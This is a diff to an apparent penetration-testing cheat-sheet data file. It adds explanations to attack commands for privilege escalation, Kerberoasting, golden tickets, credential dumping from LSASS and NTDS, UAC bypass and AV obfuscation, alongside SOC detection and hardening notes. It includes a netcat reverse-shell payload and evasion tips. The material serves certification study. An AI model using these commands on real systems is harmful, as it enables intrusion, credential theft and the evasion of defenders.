-      ]
+      ],
+      "explain": "Lists sudo rights, then turns an allowed binary into root via GTFOBins:\n  sudo -l                  show which commands you may run as root\nMany binaries (vim, less, tcpdump, openssl, ...) have documented sudo escapes on GTFOBins - e.g. sudo vim -c ':!/bin/sh' gives a root shell. Look up each allowed binary there."
     },
     {
       "type": "command",
@@ -83368,7 +83649,8 @@ const COMMAND_DATA = {
           "label": "Run a command via -z postrotate",
           "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root"
         }
-      ]
+      ],
+      "explain": "Abuses tcpdump's post-rotate command hook to run a script as root:\n  sudo tcpdump -ln -i eth0   capture on the interface\n  -w /dev/null -W 1 -G 1   rotate the capture file every 1 second, keeping 1 file\n  -z /tmp/.test            run this script on each rotated file (executed as root)\n  -Z root                  drop privileges to root (so -z runs as root)\nPoint -z at a reverse-shell script and catch the root shell on your listener."
     },
     {
       "type": "command",
@@ -83476,7 +83758,8 @@ const COMMAND_DATA = {
           "MITRE T1548.001"
         ],
         "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
-      }
+      },
+      "explain": "Finds root-owned SUID/SGID binaries to abuse via GTFOBins:\n  find /                   search the whole filesystem\n  -user root               owned by root\n  -perm -4000              the SUID bit set (SGID is -6000)\n  -exec ls -ldb {} \\; 2>/dev/null   list each, discarding errors\nLook up each unusual binary on GTFOBins for a SUID escalation (e.g. apt-get's Pre-Invoke shell escape)."
     },
     {
       "id": "cdsa-m09-suricata-rule-examples",
@@ -84205,7 +84488,8 @@ const COMMAND_DATA = {
           "label": "Crack the targeted hash (John)",
           "command": "john.exe --wordlist=<wordlist> <hashfile>"
         }
-      ]
+      ],
+      "explain": "Makes an SPN-less user Kerberoastable by writing a fake SPN you can then roast:\n  Set-DomainObject -Identity <user>   the user you have GenericWrite/GenericAll over\n  -Set @{serviceprincipalname='nonexistent/BLAH'}   plant an arbitrary SPN\nWith an SPN present, Rubeus kerberoast /user:<user> returns a TGS hash; crack it (hashcat -m 13100), then clear the SPN (-Clear serviceprincipalname) to clean up."
     },
     {
       "id": "ad-targeted-kerberoast",
@@ -84308,7 +84592,8 @@ const COMMAND_DATA = {
           "a": "Event 5136 adding a servicePrincipalName to a user account quickly followed by removing it, correlated with a 4769 RC4 TGS request for that account. The transient SPN add/remove around a roast is a strong, low-false-positive indicator.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Turns a write right over an SPN-less user into that user's cleartext password:\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account with GenericWrite/GenericAll over the target\n  --request-user <target_account>   temporarily set a fake SPN on this user, request its TGS, then remove the SPN\nYou get a $krb5tgs$ RC4 hash for <target_account>; crack it offline (hashcat -m 13100) to recover the password."
     },
     {
       "id": "cdsa-m08-tcp-abnormalities",
@@ -84709,7 +84994,8 @@ const COMMAND_DATA = {
           "label": "Register a loopback PSSession config to re-auth (RunAsCredential)",
           "command": "Register-PSSessionConfiguration -Name creddemo -RunAsCredential <domain>\\<user> -Force ; Enter-PSSession -ComputerName localhost -ConfigurationName creddemo"
         }
-      ]
+      ],
+      "explain": "Fixes the Kerberos double-hop problem - creds from a WinRM/PSRemoting session are not forwarded to a second hop, so DC access fails from the remote box:\n  createnetonly             spawn a new logon session (LOGON32_LOGON_NETONLY) with no cached creds\n  /program:powershell.exe   the process to launch in that clean session\n  /show                     reveal the spawned window\nInto that new window inject a TGT (Rubeus asktgt /ptt); now tools there authenticate to the DC directly, bypassing the missing second-hop credential."
     },
     {
       "id": "cdsa-thehive-platform",
@@ -85148,7 +85434,8 @@ const COMMAND_DATA = {
           "label": "Access the parent DC",
           "command": "psexec.py -k -no-pass <child_domain>/Administrator@<parent_dc_fqdn>"
         }
-      ]
+      ],
+      "explain": "Forges an ExtraSids golden ticket from Linux with impacket:\n  ticketer.py              build a golden ticket offline\n  -nthash <child_krbtgt_hash>   the child krbtgt NT hash that signs it (use -aesKey for AES)\n  -domain <child_domain> -domain-sid <child_sid>   the child domain and SID\n  -extra-sid <parent_EA_sid>   the parent Enterprise Admins SID added to SID History\n  Administrator            the username baked into the ticket\nExport KRB5CCNAME to the resulting .ccache and psexec the parent DC as EA."
     },
     {
       "type": "reference",
@@ -85610,7 +85897,8 @@ const COMMAND_DATA = {
           "OWASP A07:2021"
         ],
         "evasion": "Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity."
-      }
+      },
+      "explain": "Brute-forces Tomcat Manager HTTP Basic auth with Metasploit:\n  use auxiliary/scanner/http/tomcat_mgr_login   the module (set RHOSTS and it tries default credential lists)\nManager/Host-Manager access lets you deploy a malicious WAR for RCE."
     },
     {
       "type": "payload",
@@ -85912,7 +86200,8 @@ const COMMAND_DATA = {
           "note": "Pair obfuscation with runtime AMSI/logging bypass",
           "rel": "alternative"
         }
-      ]
+      ],
+      "explain": "Rebuilds offensive tooling so signature-based AV/EDR no longer recognizes it:\n  Codecepticon.exe          the source-level obfuscator\n  --action obfuscate        rename/mangle symbols and strings\n  --module csharp           obfuscate a C# project (use powershell for scripts)\n  --path <solution>         the .sln/source to rebuild\n  --map-file <map_file>     save the name mapping so you can de-obfuscate output later\nRecompile the result; DefenderCheck/ByteToLineNumber help you find and fix any bytes still flagged."
     },
     {
       "type": "command",
@@ -86235,7 +86524,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
-      }
+      },
+      "explain": "Manually mines a capture for cleartext creds and transferred files when an automated tool misses context:\n  tshark -r <file>.pcapng  read this capture\n  -Y \"ftp\"                 display filter (here FTP traffic; swap for http, etc.)\n  -T fields                output selected fields only\n  -e ftp.request.command -e ftp.request.arg   the FTP command and its argument (USER/PASS, RETR filenames)\nVariations extract downloaded files and grep strings for card numbers/keywords."
     },
     {
       "id": "cdsa-m07-tshark-wireshark",
@@ -86528,7 +86818,8 @@ const COMMAND_DATA = {
           "MITRE T1082"
         ],
         "evasion": "Use a fileless UAC bypass (fodhelper/registry) that self-cleans; remove the added registry keys after elevation."
-      }
+      },
+      "explain": "Confirms UAC state and level before choosing a bypass:\n  REG QUERY HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA   read whether UAC is on\nEnableLUA=1 means UAC is active; ConsentPromptBehaviorAdmin sets prompt strictness. The OS build number then determines which UAC bypass technique will work."
     },
     {
       "type": "command",
@@ -86622,7 +86913,8 @@ const COMMAND_DATA = {
           "MITRE T1548.002"
         ],
         "evasion": "Use a fileless UAC bypass (fodhelper/registry) that self-cleans; remove the added registry keys after elevation."
-      }
+      },
+      "explain": "Bypasses UAC via an auto-elevating binary that loads a hijackable DLL (egre55 technique):\n  C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe   an auto-elevating binary that loads srrstr.dll from a user-writable WindowsApps path\nDrop a malicious srrstr.dll into that path, then launch this binary; it loads your DLL and runs your code in a high-integrity (elevated) context without a UAC prompt."
     },
     {
       "id": "crtp-unconstrained-delegation",
@@ -86769,7 +87061,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Computer accounts granted TrustedForDelegation=True unnecessarily (often old Exchange/SharePoint setups). Print Spooler enabled on DCs. DCs not in Protected Users (tickets forwardable).",
         "vulnerable_config": "# Find unconstrained delegation hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,TrustedForDelegation\n# Output includes non-DC servers → VULNERABLE\n\n# Print Spooler running on DC (enables Printer Bug coercion):\nGet-Service -ComputerName DC01 -Name Spooler | Select-Object Status\n# Running → VULNERABLE to forced auth via MS-RPRN",
         "secure_config": "# Remove unconstrained delegation:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} | Where-Object {$_.Name -notlike '*DC*'} | ForEach-Object {\n  Set-ADAccountControl $_ -TrustedForDelegation $false\n  Set-ADComputer $_ -TrustedToAuthForDelegation $false\n  Write-Output \"Fixed: $($_.Name)\"\n}\n\n# Disable Print Spooler on all DCs:\nGet-ADDomainController -Filter * | ForEach-Object {\n  Invoke-Command -ComputerName $_.Name -ScriptBlock { Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled }\n}\n\n# Protected Users - blocks TGT forwarding:\nGet-ADGroupMember 'Domain Admins' | ForEach-Object { Add-ADGroupMember 'Protected Users' $_ }\n\n# SIEM: alert on DC-to-non-DC SMB connection:\n# Sysmon Event 3: SourceImage=SYSTEM DestinationPort=445 SourceHost=DC* DestinationHost!=DC* → ALERT"
-      }
+      },
+      "explain": "Monitors a host with unconstrained delegation for inbound TGTs to capture the DC's ticket:\n  monitor                   watch LSASS for newly cached Kerberos TGTs\n  /interval:5               poll every 5 seconds\n  /nowrap                   single-line base64 ticket output\n  /targetuser:DC$           only report tickets for the DC machine account\nCoerce the DC to connect (printerbug/DFSCoerce); its TGT is cached here, so Rubeus ptt it and DCSync as the DC."
     },
     {
       "platform": "linux",
@@ -88096,7 +88389,8 @@ const COMMAND_DATA = {
         "misconfiguration": "DC port 88 accessible from any host. MDI not deployed. Pre-authentication disabled on some accounts (also enables AS-REP roasting).",
         "vulnerable_config": "# DC accessible from any host on UDP/TCP 88 - no ACL restriction\n\n# Accounts with Kerberos pre-auth disabled:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth",
         "secure_config": "# Firewall: restrict Kerberos to domain-joined subnets:\nNew-NetFirewallRule -DisplayName 'Block external Kerberos' -Direction Inbound -Protocol TCP -LocalPort 88 -RemoteAddress Internet -Action Block\n\n# Ensure pre-auth required for all users:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# MDI sensor on each DC - 'Account enumeration reconnaissance using Kerberos' alert\n\n# Honeypot account alert in SIEM:\n# Any 4768 for honeypot_user = active enumeration"
-      }
+      },
+      "explain": "Validates which domain usernames exist via Kerberos pre-auth, without triggering lockouts:\n  kerbrute userenum         send AS-REQs and read the KDC error to tell valid from invalid names\n  --dc <dc_ip>             the Domain Controller to query\n  -d <domain>              the domain\n  <userlist>               candidate usernames to test\nValid users return a distinct response (and no lockout counter increments), giving you a confirmed username list to spray or roast."
     },
     {
       "id": "username-anarchy",
@@ -88191,7 +88485,8 @@ const COMMAND_DATA = {
           "label": "Generate from a single name",
           "command": "./username-anarchy Jane Doe"
         }
-      ]
+      ],
+      "explain": "Generates corporate username permutations from real names:\n  ./username-anarchy       the generator\n  -i <names_file>          input file of first/last names\nProduces jdoe, john.doe, doe.john, etc.; feed the output to kerbrute or a spray to discover which username format the org actually uses. --select-format picks one scheme."
     },
     {
       "id": "ad-username-generator",
@@ -89078,7 +89373,8 @@ const COMMAND_DATA = {
           "MITRE T1068",
           "MITRE T1574.006"
         ]
-      }
+      },
+      "explain": "Exploits setuid GNU screen 4.5.0 to load an attacker library as root:\n  screen -v                print the version to confirm 4.05.00 / v4.5.0\nThe bug lets you overwrite /etc/ld.so.preload so a library of yours loads with root privilege; the screenroot.sh PoC compiles libhax.so + a rootshell and triggers it, dropping /tmp/rootshell."
     },
     {
       "id": "wafw00f",
@@ -89294,7 +89590,8 @@ const COMMAND_DATA = {
           "label": "Restart to execute as SYSTEM",
           "command": "sc stop <service> & sc start <service>"
         }
-      ]
+      ],
+      "explain": "Abuses SERVICE_CHANGE_CONFIG rights to repoint a service's binPath:\n  sc config <service>      change the service configuration\n  binpath=\"cmd /c net localgroup administrators <user> /add\"   run this command instead of the real binary\nRestart the service to execute as SYSTEM (adding you to Administrators), then restore the original binPath. accesschk -quvcw / PowerUp's Get-ModifiableService find candidates."
     },
     {
       "type": "command",
@@ -89421,7 +89718,8 @@ const COMMAND_DATA = {
           "label": "Replace the binary + restart",
           "command": "copy /y evil.exe '<service_binary_path>' ; sc stop <service> & sc start <service>"
         }
-      ]
+      ],
+      "explain": "Overwrites a service executable that is writable by your user:\n  cmd /c copy /Y payload.exe \"<writable_service_binary>\"   replace the binary (keep a copy of the original)\nRestart the service (sc stop/start) and your payload runs as the service account, usually SYSTEM. PowerUp's Get-ModifiableServiceFile finds them and Invoke-ServiceAbuse automates it."
     },
     {
       "type": "command",
@@ -89538,7 +89836,8 @@ const COMMAND_DATA = {
           "label": "Follow the highest-signal finding",
           "command": "# unquoted path / modifiable service / AlwaysInstallElevated -> exploit"
         }
-      ]
+      ],
+      "explain": "Runs SharpUp to flag Windows privesc misconfigurations:\n  .\\SharpUp.exe audit      check modifiable service binaries, weak service/registry ACLs, unquoted paths, and AlwaysInstallElevated\nFollow the highest-signal hit (unquoted path / modifiable service / AlwaysInstallElevated), confirming with icacls before exploiting; pass a specific check name (e.g. UnquotedServicePath) to narrow it."
     },
     {
       "type": "command",
@@ -89629,7 +89928,8 @@ const COMMAND_DATA = {
           "label": "Startup folder",
           "command": "Get-ChildItem \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""
         }
-      ]
+      ],
+      "explain": "Lists autostart programs to find a writable one that runs at another user's logon:\n  Get-CimInstance Win32_StartupCommand   enumerate autostart entries\n  | select Name, command, Location, User | fl   show each entry's command, where it is registered, and which user it runs for\nIf an entry or its target binary is writable by you, replace it with a payload that executes when a higher-privileged user logs in."
     },
     {
       "type": "command",
@@ -89751,7 +90051,8 @@ const COMMAND_DATA = {
           "label": "Restart the service to trigger it",
           "command": "sc stop <service> & sc start <service>"
         }
-      ]
+      ],
+      "explain": "Exploits an unquoted service path containing spaces:\n  wmic service get name,displayname,pathname,startmode   list services\n  | findstr /i \"auto\"      keep auto-start ones\n  | findstr /i /v \"c:\\windows\\\\\"   drop system-dir services\n  | findstr /i /v \"\\\"\"     keep only paths that are NOT quoted\nWindows tries each space-delimited prefix (C:\\Program.exe, ...), so drop a payload named to match a writable earlier segment and restart the service to run it as SYSTEM."
     },
     {
       "type": "command",
@@ -89858,7 +90159,8 @@ const COMMAND_DATA = {
           "label": "Restart the service",
           "command": "sc stop <service> & sc start <service>"
         }
-      ]
+      ],
+      "explain": "Hijacks a service whose registry key you can write by rewriting its ImagePath:\n  Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<service>   the writable service key\n  -Name ImagePath          the value that points to the service executable\n  -Value \"C:\\path\\nc.exe -e cmd.exe <lhost> <lport>\"   replace it with your payload command\nRestart the service and it executes your command as its account (often SYSTEM). accesschk -kvuqsw finds writable service keys."
     },
     {
       "type": "command",
@@ -91603,7 +91905,8 @@ const COMMAND_DATA = {
           "MITRE T1053.003",
           "MITRE T1574"
         ]
-      }
+      },
+      "explain": "Weaponizes a root cron running tar with a wildcard in a writable directory:\n  echo '...sudoers append...' > root.sh   create the payload script tar will execute\nBecause tar * expands your filenames as arguments, also create files named --checkpoint=1 and --checkpoint-action=exec=sh root.sh. When the cron's tar runs, it treats them as options and executes root.sh as root (here appending a NOPASSWD sudoers line)."
     },
     {
       "id": "ad-windapsearch-users",
@@ -91812,7 +92115,8 @@ const COMMAND_DATA = {
           "label": "Parse offline with secretsdump",
           "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
         }
-      ]
+      ],
+      "explain": "Saves the registry hives needed to extract local secrets offline:\n  reg.exe save hklm\\sam C:\\sam.save   export the SAM hive (local password hashes)\nAlso save SYSTEM (holds the boot key that decrypts SAM) and SECURITY (LSA secrets + cached domain creds). Exfil all three, then impacket-secretsdump -sam -system -security LOCAL recovers the hashes. Requires an elevated prompt."
     },
     {
       "id": "ntds-vss",
@@ -91940,7 +92244,8 @@ const COMMAND_DATA = {
           "label": "ntdsutil IFM",
           "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q"
         }
-      ]
+      ],
+      "explain": "Extracts the AD database from a DC by snapshotting the locked volume:\n  vssadmin CREATE SHADOW /For=C:   make a Volume Shadow Copy so NTDS.dit can be read despite the AD lock\nThen copy NTDS.dit out of the \\\\?\\GLOBALROOT snapshot and reg save the SYSTEM hive (for the boot key), and run impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL to dump every domain account's NT hash. ntdsutil IFM is the built-in alternative."
     },
     {
       "id": "windows-cred-locations",
@@ -92029,7 +92334,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1003"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A reference map of where Windows keeps secrets and what the dumps look like, anchored by the hive-save command:\n  reg.exe save hklm\\sam C:\\sam.save   export the SAM (local hashes) - the entry point to offline cracking\nThe card lists which hive holds what (SYSTEM = boot key to decrypt SAM, SECURITY = LSA secrets + DCC2), the SAM/DCC2 hash line formats, and which apps store DPAPI-protected creds - so you know which files to grab and what the extracted hashes should look like."
     },
     {
       "id": "lsass-dump",
@@ -92144,7 +92450,8 @@ const COMMAND_DATA = {
           "label": "Task Manager (GUI: right-click lsass -> Create dump file)",
           "command": "# %temp%\\lsass.DMP"
         }
-      ]
+      ],
+      "explain": "Dumps LSASS memory with a signed LOLBIN so credentials can be parsed offline:\n  rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump   call comsvcs MiniDump export\n  <lsass_pid>              the LSASS process id (from tasklist /svc or Get-Process lsass)\n  C:\\lsass.dmp             output dump path\n  full                     capture the full process memory\nRequires local admin/SeDebug. Exfil the dump and parse with pypykatz (no Mimikatz on the target) to recover NT hashes and tickets."
     },
     {
       "id": "dism-enable-telnet",
@@ -92348,7 +92655,8 @@ const COMMAND_DATA = {
           "label": "Reuse a saved credential (no password needed)",
           "command": "runas /savecred /user:<domain>\\<user> cmd"
         }
-      ]
+      ],
+      "explain": "Lists Windows Credential Manager entries so you can reuse them without knowing the password:\n  cmdkey /list             show saved credentials (targets and usernames, not the secrets)\nIf a useful entry exists, runas /savecred /user:<domain>\\<user> cmd launches a process as that user using the stored secret - a path to lateral movement or privilege gain. vaultcmd /listcreds inspects the DPAPI vault too."
     },
     {
       "type": "command",
@@ -92896,7 +93204,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Recursively greps the filesystem for a keyword across config and script types:\n  findstr /S               search subdirectories recursively\n  /I                       case-insensitive\n  /M                       print only the matching filenames (not the lines)\n  /C:\"password\"           the literal string to find\n  *.txt *.ini *.config *.xml *.ps1 *.yml   the file types to scan\nAim it at web.config, unattend.xml, SYSVOL, and IT shares; the variations use Get-ChildItem to locate .kdbx and office docs."
     },
     {
       "type": "command",
@@ -93733,7 +94042,8 @@ const COMMAND_DATA = {
         "file-search",
         "powershell",
         "credential-hunting"
-      ]
+      ],
+      "explain": "Recursively searches the Windows filesystem for credential and config files with PowerShell:\n  Get-ChildItem -Path C:\\  walk the whole C: drive\n  -Include *.kdbx          match this pattern (here KeePass databases; swap for *.pem, web.config, unattend.xml, etc.)\n  -File -Recurse           only files, into every subdirectory\n  -ErrorAction SilentlyContinue   suppress access-denied noise from protected dirs\nThe variations target office docs, SSH keys, web.config connection strings, and sysprep answer files."
     },
     {
       "id": "cdsa-m13-windows-artifacts",
@@ -94162,7 +94472,8 @@ const COMMAND_DATA = {
         "powershell",
         "privesc",
         "local"
-      ]
+      ],
+      "explain": "PowerShell-native local user/group and software enumeration:\n  Get-LocalGroup           list local groups\n  | Select-Object Name, Description   show each group's name and purpose\nThe variations enumerate Administrators membership, installed software (from the Uninstall registry keys), running services and their run-as accounts, and hotfixes - richer, scriptable output than net.exe."
     },
     {
       "type": "command",
@@ -94252,7 +94563,8 @@ const COMMAND_DATA = {
           "MITRE T1083"
         ],
         "evasion": "Run one consolidated enumeration pass (winPEAS/Seatbelt) in-memory and save output off-host rather than repeated noisy queries."
-      }
+      },
+      "explain": "Checks endpoint protections before dropping tools:\n  Get-MpComputerStatus     report Defender real-time protection and AMSI status\nAlso read the effective AppLocker policy and test whether a specific binary path is allowed for your user - so you pick execution methods the host will actually permit."
     },
     {
       "type": "cheatsheet",
@@ -94359,7 +94671,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1082"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "The automated Windows privesc enumerators - run one or more to surface vectors:\n  winPEASx64.exe           broad sweep: services, ACLs, unquoted paths, stored creds, patches\n  Seatbelt.exe -group=all  security-relevant host checks\n  SharpUp.exe audit        modifiable services / weak ACLs / AlwaysInstallElevated\n  Invoke-AllChecks         PowerUp's PowerShell equivalent\nUpload to a writable dir like C:\\Windows\\Temp and triage the highest-signal findings."
     },
     {
       "type": "cheatsheet",
@@ -94477,7 +94790,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1082"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Baseline Windows host enumeration to feed patch/service escalation paths:\n  systeminfo               OS version, build, patch level, architecture, domain\nThe variations add running processes/services (tasklist /svc, sc query), installed software, hotfixes (wmic qfe / Get-HotFix), and listening ports (netstat -ano) - the raw material for choosing an escalation."
     },
     {
       "type": "command",
@@ -94567,7 +94881,8 @@ const COMMAND_DATA = {
           "MITRE T1559.001"
         ],
         "evasion": "Run one consolidated enumeration pass (winPEAS/Seatbelt) in-memory and save output off-host rather than repeated noisy queries."
-      }
+      },
+      "explain": "Lists named pipes and their permissions to find an abusable one:\n  accesschk.exe            Sysinternals ACL checker\n  -accepteula              auto-accept the EULA (non-interactive)\n  -w \\pipe\\*               only pipes your user can write to\n  -v                       verbose (show the DACL)\nA writable service pipe (e.g. WindscribeService) can allow impersonation or command execution - see CVE-2020-27350-style abuses."
     },
     {
       "type": "cheatsheet",
@@ -94668,7 +94983,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1033"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Enumerates your token privileges and group memberships - the key privesc signal:\n  whoami /priv             list the current token's privileges\nSeImpersonate, SeDebug, SeBackup, SeTakeOwnership, and SeLoadDriver each map to a specific escalation path. The variations add whoami /groups and local user/group membership (net localgroup administrators)."
     },
     {
       "type": "command",
@@ -95951,7 +96267,8 @@ const COMMAND_DATA = {
           "label": "Multiple users",
           "command": "wpscan --url http://<url> -U users.txt -P rockyou.txt --password-attack wp-login"
         }
-      ]
+      ],
+      "explain": "Brute-forces a WordPress account through the XML-RPC endpoint:\n  wpscan                   the WordPress scanner\n  --password-attack xmlrpc  use xmlrpc (faster/quieter than wp-login)\n  -t 20                    20 threads\n  -U <user> -P <wordlist>  the target user and password list\n  --url http://<url>       the site\nRecovered admin creds lead to code execution via the theme editor."
     },
     {
       "id": "ad-writedacl-linux",
@@ -96053,7 +96370,8 @@ const COMMAND_DATA = {
           "a": "Event 4662 containing the replication extended-right GUIDs (1131f6aa-... and 1131f6ad-...) requested by an account that is not a Domain Controller, ideally correlated with a preceding 5136 change to the domain's nTSecurityDescriptor. Any non-DC replication is an incident.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Abuses WriteDACL over the domain object to grant yourself DCSync rights, then dump hashes:\n  --host <dc_ip>            the Domain Controller\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account holding WriteDACL\n  add dcsync <user>        write the DS-Replication-Get-Changes(-All) ACEs onto <user>\nWith replication rights, run secretsdump.py to DCSync the domain (krbtgt, Administrator, all NT hashes); remove the ACE afterward to clean up."
     },
     {
       "id": "pth-freerdp",
@@ -96140,7 +96458,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Machines with identical local admin passwords (the classic PtH enabler)\n# No credential guard, no Protected Users group\n# NTLM enabled (default on all Windows versions)\n\n# Confirm NTLM is negotiated (SMB example):\n# Network capture shows NTLMSSP_AUTH frames on port 445\n\n# Accounts NOT in Protected Users group (PtH works against these):\nGet-ADGroupMember 'Protected Users'  # should list all privileged accounts\n\n# Local admin SID S-1-5-21-...-500 (RID 500) allows remote PtH by default\n# Even with UAC RemoteRestrictions, RID-500 bypasses the filter",
         "secure_config": "# 1. Enable Credential Guard (blocks NTLM hash extraction from LSASS)\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n#   'Turn on Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 2. Add privileged accounts to Protected Users group (no NTLM, no RC4)\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'Domain Admins'\n\n# 3. LAPS - unique random local admin passwords per machine\n# Eliminates lateral movement via shared local admin hash\nEnable-LapsADSchema\nSet-LAPSConfig -PolicyMode Automatic -PasswordLength 20 -PasswordAgeDays 30\n\n# 4. Block NTLM (requires AES Kerberos everywhere first)\n# GPO: Security Settings > Local Policies > Security Options\n#   'Network Security: Restrict NTLM: Incoming NTLM traffic' = Deny all\n\n# 5. Disable RID-500 remote admin:\n# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n#   LocalAccountTokenFilterPolicy = 0 (default)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Pass-the-hash over RDP using Restricted Admin mode:\n  xfreerdp /v:<ip>         the RDP target\n  /u:<user>                the account\n  /pth:<nt_hash>           authenticate with the NT hash (Restricted Admin)\nThe target must have Restricted Admin enabled - set HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin to 0 first (which itself needs admin there)."
     },
     {
       "id": "xslt-injection",
@@ -98867,7 +99186,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 950,
-  "buildDate": "2026-09-27T10:58:43.694Z",
+  "buildDate": "2026-09-27T11:27:08.049Z",
   "certifications": [
     "CDSA",
     "CPTS",
